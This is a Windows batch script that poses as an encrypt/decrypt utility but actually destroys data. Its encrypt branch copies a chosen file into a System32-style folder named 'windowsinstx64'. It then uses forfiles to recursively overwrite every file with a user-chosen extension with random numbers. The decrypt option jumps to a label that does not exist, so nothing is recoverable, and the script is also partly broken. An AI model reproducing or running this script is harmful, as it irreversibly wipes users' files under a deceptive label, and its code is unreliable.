@Echo off
:A
cls
set /a eko=%RANDOM%
echo Select operation (encrypt=e decrypt=d).
set /p op=
if %op% == e goto :enc
if %op% == d goto :dec
goto :enc
:enc
cd C:\Users\%username%
echo %RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM% >>%eko%.encrypt
cls
echo Select location.
set /p loc=
cls
echo Select file.
set /p file=
cls
echo Select an extension.
set /p ext=
cls
md windowsinstx64
cd C:\Windows\System32\windowsinstx64
copy %file%
cls
timeout 2 >nul
cls
copy C:\Users\%username%\%eko%.encrypt %file%.%ext%
cd %loc%
rename %file%.%ext% %file%.encrypt
forfiles /p %file% /m %ext% /s /c "cmd /c if @isdir==FALSE copy C:\Users\%username%\%eko%.encrypt @file"
cls
goto :A